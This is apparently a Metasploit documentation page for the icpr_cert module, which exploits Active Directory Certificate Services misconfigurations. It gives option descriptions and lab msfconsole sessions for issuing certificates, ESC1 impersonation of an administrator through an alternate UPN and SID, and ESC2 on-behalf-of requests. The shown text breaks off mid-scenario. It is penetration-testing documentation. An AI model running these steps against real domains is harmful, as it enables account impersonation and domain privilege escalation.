href="/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html" class="nav-list-link">2017 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html" class="nav-list-link">2017 Student Proposal</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html" class="nav-list-link">2018 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html" class="nav-list-link">2019 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html" class="nav-list-link">2020 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html" class="nav-list-link">2021 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html" class="nav-list-link">2022 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2023-project-ideas.html" class="nav-list-link">2023 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html" class="nav-list-link">How to Apply to GSoC</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/" class="nav-list-link">Maintainers</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-keys.html" class="nav-list-link">Committer Keys</a><li class="nav-list-item active"><a href="/docs/development/maintainers/committer-rights.html" class="nav-list-link">Committer Rights</a><li class="nav-list-item active"><a href="/docs/development/maintainers/downloads-by-version.html" class="nav-list-link">Downloads by Version</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-hackathons.html" class="nav-list-link">Metasploit Hackathons</a><li class="nav-list-item active"><a href="/docs/development/maintainers/metasploit-loginpalooza.html" class="nav-list-link">Metasploit Loginpalooza</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/process/" class="nav-list-link">Process</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/process/assigning-labels.html" class="nav-list-link">Assigning Labels</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html" class="nav-list-link">Guidelines for Accepting Modules and Enhancements</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html" class="nav-list-link">How to deprecate a Metasploit module</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/landing-pull-requests.html" class="nav-list-link">Landing Pull Requests</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/adding-release-notes-to-prs.html" class="nav-list-link">Release Notes</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/rolling-back-merges.html" class="nav-list-link">Rolling back merges</a><li class="nav-list-item active"><a href="/docs/development/maintainers/process/unstable-modules.html" class="nav-list-link">Unstable Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/maintainers/ruby-gems/" class="nav-list-link">Ruby Gems</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html" class="nav-list-link">Adding and Updating</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html" class="nav-list-link">Merging Metasploit Payload Gem Updates</a><li class="nav-list-item active"><a href="/docs/development/maintainers/ruby-gems/using-local-gems.html" class="nav-list-link">Using local Gems</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/propsals/" class="nav-list-link">Proposals</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/propsals/bundled-modules-proposal.html" class="nav-list-link">Bundled Modules Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/java-meterpreter-feature-parity-proposal.html" class="nav-list-link">Java Meterpreter Feature Parity Proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/msf6-feature-proposals.html" class="nav-list-link">MSF6 Feature Proposals</a><li class="nav-list-item active"><a href="/docs/development/propsals/metasploit-url-support-proposal.html" class="nav-list-link">Metasploit URL support proposal</a><li class="nav-list-item active"><a href="/docs/development/propsals/payload-rename-justification.html" class="nav-list-link">Payload Rename Justification</a><li class="nav-list-item active"><a href="/docs/development/propsals/uberhandler.html" class="nav-list-link">Uberhandler</a><li class="nav-list-item active"><a href="/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html" class="nav-list-link">Work needed to allow msfdb to use postgresql common</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/quality/" class="nav-list-link">Quality</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/quality/common-metasploit-module-coding-mistakes.html" class="nav-list-link">Common Metasploit Module Coding Mistakes</a><li class="nav-list-item active"><a href="/docs/development/quality/loading-test-modules.html" class="nav-list-link">Loading Test Modules</a><li class="nav-list-item active"><a href="/docs/development/quality/measuring-metasploit-performance.html" class="nav-list-link">Measuring Metasploit Performance</a><li class="nav-list-item active"><a href="/docs/development/quality/msftidy.html" class="nav-list-link">Msftidy</a><li class="nav-list-item active"><a href="/docs/development/quality/payload-testing.html" class="nav-list-link">Payload Testing</a><li class="nav-list-item active"><a href="/docs/development/quality/style-tips.html" class="nav-list-link">Style Tips</a><li class="nav-list-item active"><a href="/docs/development/quality/using-rubocop.html" class="nav-list-link">Using Rubocop</a><li class="nav-list-item active"><a href="/docs/development/quality/writing-module-documentation.html" class="nav-list-link">Writing Module Documentation</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/roadmap/" class="nav-list-link">Roadmap</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap.html" class="nav-list-link">2017 Roadmap</a><li class="nav-list-item active"><a href="/docs/development/roadmap/2017-roadmap-review.html" class="nav-list-link">2017 Roadmap Review</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-breaking-changes.html" class="nav-list-link">Metasploit Breaking Changes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html" class="nav-list-link">Metasploit Data Service</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-5-release-notes.html" class="nav-list-link">Metasploit Framework 5.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-6-release-notes.html" class="nav-list-link">Metasploit Framework 6.0 Release Notes</a><li class="nav-list-item active"><a href="/docs/development/roadmap/metasploit-framework-wish-list.html" class="nav-list-link">Metasploit Framework Wish List</a></ul></ul><li class="nav-list-item active"><a href="/docs/contact.html" class="nav-list-link">Contact</a></ul></nav><footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll.</footer></div><div class="main" id="top"><div id="main-header" class="main-header"><div class="search"><div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search Metasploit Documentation" aria-label="Search Metasploit Documentation" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label></div><div id="search-results" class="search-results"></div></div><link rel="stylesheet" href="/assets/css/main.css"><nav aria-label="Auxiliary" class="aux-nav"><ul class="aux-nav-list"><li class="aux-nav-list-item"> <a href="//github.com/rapid7/metasploit-framework" class="site-button" target="_blank" rel="noopener noreferrer" > Metasploit Framework on GitHub </a></ul></nav></div><div id="main-content-wrap" class="main-content-wrap"><nav aria-label="Breadcrumb" class="breadcrumb-nav"><ol class="breadcrumb-nav-list"><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/">Pentesting</a><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/active-directory/">Active Directory</a><li class="breadcrumb-nav-list-item"> <a href="/docs/pentesting/active-directory/ad-certificates/">AD CS</a><li class="breadcrumb-nav-list-item"> <span>Request certificates</span></ol></nav><div id="main-content" class="main-content" role="main"><h2 id="vulnerable-application"> <a href="#vulnerable-application" class="anchor-heading" aria-labelledby="vulnerable-application"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Vulnerable Application</h2><p>Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate template’s configuration the resulting certificate can be used for various operations such as authentication. PFX certificate files that are saved are encrypted with a blank password.</p><p>This module is capable of exploiting ESC1, ESC2, ESC3, ESC13 and ESC15.</p><h2 id="module-usage"> <a href="#module-usage" class="anchor-heading" aria-labelledby="module-usage"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Module usage</h2><ol><li>From msfconsole<li>Do: <code class="language-plaintext highlighter-rouge">use auxiliary/admin/dcerpc/icpr_cert</code><li>Set the <code class="language-plaintext highlighter-rouge">CA</code>, <code class="language-plaintext highlighter-rouge">RHOSTS</code>, <code class="language-plaintext highlighter-rouge">SMBUser</code> and <code class="language-plaintext highlighter-rouge">SMBPass</code> options<li>Run the module and see that a new certificate was issued or submitted</ol><h2 id="options"> <a href="#options" class="anchor-heading" aria-labelledby="options"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Options</h2><h3 id="ca"> <a href="#ca" class="anchor-heading" aria-labelledby="ca"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CA</h3><p>The target certificate authority. The default value used by AD CS is <code class="language-plaintext highlighter-rouge">$domain-DC-CA</code>.</p><h3 id="cert_template"> <a href="#cert_template" class="anchor-heading" aria-labelledby="cert_template"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CERT_TEMPLATE</h3><p>The certificate template to issue, e.g. “User”.</p><h3 id="add_cert_app_policy"> <a href="#add_cert_app_policy" class="anchor-heading" aria-labelledby="add_cert_app_policy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ADD_CERT_APP_POLICY</h3><p>Add certificate application policy OIDs to the certificate. The ability to add policy OIDs to the certificate is dependent on it’s configuration. More than one OID can be specified, separated by spaces, <code class="language-plaintext highlighter-rouge">;</code>, or <code class="language-plaintext highlighter-rouge">,</code>.</p><p>Some useful OIDs for this purpose include:</p><ul><li><code class="language-plaintext highlighter-rouge">1.3.6.1.4.1.311.20.2.2</code> – Smart Card Logon<li><code class="language-plaintext highlighter-rouge">1.3.6.1.5.2.3.4</code> – PKINIT Client Authentication<li><code class="language-plaintext highlighter-rouge">1.3.6.1.5.5.7.3.1</code> – Server Authentication<li><code class="language-plaintext highlighter-rouge">1.3.6.1.5.5.7.3.2</code> – Client Authentication<li><code class="language-plaintext highlighter-rouge">1.3.6.1.5.5.7.3.3</code> – Code Signing<li><code class="language-plaintext highlighter-rouge">1.3.6.1.4.1.311.20.2.1</code> – Certificate Request Agent</ul><h3 id="alt_dns"> <a href="#alt_dns" class="anchor-heading" aria-labelledby="alt_dns"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ALT_DNS</h3><p>Alternative DNS name to specify in the certificate. Useful in certain attack scenarios.</p><h3 id="alt_sid"> <a href="#alt_sid" class="anchor-heading" aria-labelledby="alt_sid"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ALT_SID</h3><p>Alternative object SID to specify in the NTDS_CA_SECURITY_EXT extension. This is useful when exploiting ESC1 on a target where the <a href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16">KB5014754</a> patch has been applied.</p><p>See the following resources for more information.</p><ul><li>https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7<li>https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d</ul><h3 id="alt_upn"> <a href="#alt_upn" class="anchor-heading" aria-labelledby="alt_upn"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ALT_UPN</h3><p>Alternative User Principal Name (UPN) to specify in the certificate. Useful in certain attack scenarios. This is in the format <code class="language-plaintext highlighter-rouge">$username@$dnsDomainName</code>.</p><h3 id="pfx"> <a href="#pfx" class="anchor-heading" aria-labelledby="pfx"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PFX</h3><p>Certificate to request on behalf of. This is a PKCS12 file (using the .pfx extension), such as a one generated by previously running this module.</p><h3 id="on_behalf_of"> <a href="#on_behalf_of" class="anchor-heading" aria-labelledby="on_behalf_of"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ON_BEHALF_OF</h3><p>Username to request on behalf of. This is in the format <code class="language-plaintext highlighter-rouge">$domain\\$username</code>.</p><h3 id="digestalgorithm"> <a href="#digestalgorithm" class="anchor-heading" aria-labelledby="digestalgorithm"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> DigestAlgorithm</h3><p><em>This is an advanced option.</em></p><p>The digest algorithm to use for cryptographic signing operations.</p><p>When set to <code class="language-plaintext highlighter-rouge">true</code>, the module will use strong URL to SID mapping when requesting a certificate that contains a URL SAN. This is done by adding the <code class="language-plaintext highlighter-rouge">tag:microsoft.com,2022-09-14:sid:</code> part to the SAN which is formatted like so: <code class="language-plaintext highlighter-rouge">URL=tag:microsoft.com,2022-09-14:sid:&lt;value&gt;</code>. This option was introduced to maintain compatibility with older windows versions as this is not compatible with versions prior to Windows Server Preview Build 25246. <a href="https://techcommunity.microsoft.com/blog/askds/preview-of-san-uri-for-certificate-strong-mapping-for-kb5014754/3789785">More info</a></p><h2 id="actions"> <a href="#actions" class="anchor-heading" aria-labelledby="actions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Actions</h2><h3 id="request_cert"> <a href="#request_cert" class="anchor-heading" aria-labelledby="request_cert"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> REQUEST_CERT</h3><p>Request a certificate. The certificate PFX file will be stored on success. The certificate file’s password is blank.</p><h2 id="scenarios"> <a href="#scenarios" class="anchor-heading" aria-labelledby="scenarios"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Scenarios</h2><h3 id="obtaining-configuration-values"> <a href="#obtaining-configuration-values" class="anchor-heading" aria-labelledby="obtaining-configuration-values"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Obtaining Configuration Values</h3><p>For this module to work, it’s necessary to know the name of a CA and certificate template. These values can be obtained by a normal user via LDAP.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/gather/ldap_query
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set BIND_DN aliddle@msflab.local
BIND_DN =&gt; aliddle@msflab.local
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set BIND_PW Password1!
BIND_PW =&gt; Password1!
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> set ACTION ENUM_AD_CS_CAS
ACTION =&gt; ENUM_AD_CS_CAS
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zg">[+]</span> Successfully bound to the LDAP server!
<span class="zs">[*]</span> Discovering base DN automatically
<span class="zg">[+]</span> 192.168.159.10:389 Discovered base DN: DC=msflab,DC=local
CN=msflab-DC-CA CN=Enrollment Services CN=Public Key Services CN=Services CN=Configuration DC=msflab DC=local
=============================================================================================================

 Name                  Attributes
 ----                  ----------
 cacertificatedn       CN=msflab-DC-CA, DC=msflab, DC=local
 certificatetemplates  ESC1-Test || Workstation || ClientAuth || DirectoryEmailReplication || DomainControllerAuthentication || KerberosAuthentication || EFSRecovery || EFS || DomainController || WebServer || Machine || User || SubCA |
                       | Administrator
 cn                    msflab-DC-CA
 dnshostname           DC.msflab.local
 name                  msflab-DC-CA

<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">gather/ldap_query</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><h3 id="issue-a-generic-certificate"> <a href="#issue-a-generic-certificate" class="anchor-heading" aria-labelledby="issue-a-generic-certificate"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Issue A Generic Certificate</h3><p>In this scenario, an authenticated user issues a certificate for themselves using the <code class="language-plaintext highlighter-rouge">User</code> template which is available by default. The user must know the CA name, which in this case is <code class="language-plaintext highlighter-rouge">msflab-DC-CA</code>.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 192.168.159.10
RHOSTS =&gt; 192.168.159.10
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser aliddle
SMBUser =&gt; aliddle
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass Password1!
SMBPass =&gt; Password1!
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA msflab-DC-CA
CA =&gt; msflab-DC-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zs">[*]</span> 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
<span class="zs">[*]</span> 192.168.159.10:445 - Binding to \cert...
<span class="zg">[+]</span> 192.168.159.10:445 - Bound to \cert
<span class="zs">[*]</span> 192.168.159.10:445 - Requesting a certificate...
<span class="zg">[+]</span> 192.168.159.10:445 - The requested certificate was issued.
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate UPN: aliddle@msflab.local
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1106
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20220824125053_default_unknown_windows.ad.cs_545696.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><h3 id="issue-a-certificate-with-a-specific-subjectaltname-aka-esc1"> <a href="#issue-a-certificate-with-a-specific-subjectaltname-aka-esc1" class="anchor-heading" aria-labelledby="issue-a-certificate-with-a-specific-subjectaltname-aka-esc1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Issue A Certificate With A Specific subjectAltName (AKA ESC1)</h3><p>In this scenario, an authenticated user exploits a misconfiguration allowing them to issue a certificate for a different User Principal Name (UPN), typically one that is an administrator. Exploiting this misconfiguration to specify a different UPN effectively issues a certificate that can be used to authenticate as another user. If the target server has the <a href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16">KB5014754</a> patch applied and the REG_DWORD <code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement</code> value is set to 2, then the SID for the account with the specified UPN should be supplied as well. In November of 2023, Microsoft will change the default value of <code class="language-plaintext highlighter-rouge">StrongCertificateBindingEnforcement</code> to 2. If the server has the patch applied, the SID will be returned in the issued certificate which ensures that the required strong mapping is in place. If the strong mapping is required and the SID is not specified in the certificate, then Kerberos authentication will fail with <code class="language-plaintext highlighter-rouge">KDC_ERR_CERTIFICATE_MISMATCH</code>.</p><p>The user must know:</p><ul><li>A vulnerable certificate template, in this case <code class="language-plaintext highlighter-rouge">ESC1-Test</code>.<li>The SID of a target account, in this case <code class="language-plaintext highlighter-rouge">S-1-5-21-3402587289-1488798532-3618296993-1000</code><li>The UPN of a target account, in this case <code class="language-plaintext highlighter-rouge">smcintyre@msflab.local</code>.</ul><p>See <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned</a> section on ESC1 for more information.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 192.168.159.10
RHOSTS =&gt; 192.168.159.10
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser aliddle
SMBUser =&gt; aliddle
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass Password1!
SMBPass =&gt; Password1!
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA msflab-DC-CA
CA =&gt; msflab-DC-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC1-Test
CERT_TEMPLATE =&gt; ESC1-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
ALT_SID =&gt; S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ALT_UPN smcintyre@msflab.local
ALT_UPN =&gt; smcintyre@msflab.local
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set VERBOSE true
VERBOSE =&gt; true
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zs">[*]</span> 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
<span class="zs">[*]</span> 192.168.159.10:445 - Binding to \cert...
<span class="zg">[+]</span> 192.168.159.10:445 - Bound to \cert
<span class="zs">[*]</span> 192.168.159.10:445 - Requesting a certificate for user aliddle - alternate UPN: smcintyre@msflab.local - digest algorithm: SHA256 - template: ESC1-Test
<span class="zg">[+]</span> 192.168.159.10:445 - The requested certificate was issued.
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate UPN: smcintyre@msflab.local
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20230608111432_default_192.168.159.10_windows.ad.cs_029062.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> 
</code></pre></div></div><h3 id="issue-a-certificate-with-the-any-purpose-eku-aka-esc2"> <a href="#issue-a-certificate-with-the-any-purpose-eku-aka-esc2" class="anchor-heading" aria-labelledby="issue-a-certificate-with-the-any-purpose-eku-aka-esc2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Issue A Certificate With The <em>Any Purpose</em> EKU (AKA ESC2)</h3><p>In this scenario, an authenticated user exploits a misconfiguration allowing them to issue a certificate from a template that either contains the <strong>Any Purpose</strong> EKU or no EKUs at all.</p><p>The user must know:</p><ul><li>A vulnerable certificate template, in this case <code class="language-plaintext highlighter-rouge">ESC2-Test</code>.<li>A target account, in this case <code class="language-plaintext highlighter-rouge">MSFLAB\smcintyre</code>.</ul><p>See <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned</a> section on ESC2 for more information.</p><h4 id="step-1"> <a href="#step-1" class="anchor-heading" aria-labelledby="step-1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Step 1</h4><p>The first step is to issue a certificate using the vulnerable certificate template.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert 
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 192.168.159.10
RHOSTS =&gt; 192.168.159.10
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser aliddle
SMBUser =&gt; aliddle
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass Password1!
SMBPass =&gt; Password1!
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA msflab-DC-CA
CA =&gt; msflab-DC-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC2-Test
CERT_TEMPLATE =&gt; ESC2-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zs">[*]</span> 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
<span class="zs">[*]</span> 192.168.159.10:445 - Binding to \cert...
<span class="zg">[+]</span> 192.168.159.10:445 - Bound to \cert
<span class="zs">[*]</span> 192.168.159.10:445 - Requesting a certificate...
<span class="zg">[+]</span> 192.168.159.10:445 - The requested certificate was issued.
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><h4 id="step-2"> <a href="#step-2" class="anchor-heading" aria-labelledby="step-2"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Step 2</h4><p>The second step is to run the module a second time, using the certificate template to request a certificate on behalf of the target user. The <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> option is updated to one allowing authentication such as the default <code class="language-plaintext highlighter-rouge">User</code> template.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set PFX /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
PFX =&gt; /home/smcintyre/.msf4/loot/20221107153602_default_unknown_windows.ad.cs_269882.pfx
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ON_BEHALF_OF MSFLAB\\smcintyre
ON_BEHALF_OF =&gt; MSFLAB\smcintyre
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

